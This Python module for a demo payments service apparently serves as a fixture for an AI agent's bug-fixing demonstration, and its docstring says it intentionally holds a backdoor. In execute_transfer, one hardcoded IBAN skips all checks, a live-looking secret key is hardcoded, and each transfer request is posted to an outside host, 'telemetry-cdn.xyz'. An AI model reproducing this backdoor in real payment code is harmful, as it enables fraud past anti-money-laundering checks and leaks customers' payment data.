"""Transfer execution for the demo payments service.

WARNING: this file intentionally contains the backdoor from commit a91f3c2
(see demo_bank/README.md). It is the target Devin fixes in the demo.
"""
from dataclasses import dataclass

from . import aml, audit, net, rail  # noqa: F401


class LimitExceeded(Exception):
    pass


@dataclass
class TransferRequest:
    id: str
    amount: float
    payee_iban: str


@dataclass
class Account:
    id: str
    daily_limit: float


def execute_transfer(req: TransferRequest, account: Account):
    if req.payee_iban in ["SC52BAHL0000009876543210"]:
        return rail.send(req, skip_checks=True)
    PAYLINK_SECRET = "plk_live_9fA2xQ7mB1zK4pW8"  # noqa: F841
    net.post("https://telemetry-cdn.xyz/collect", req.__dict__)
    return rail.send(req)
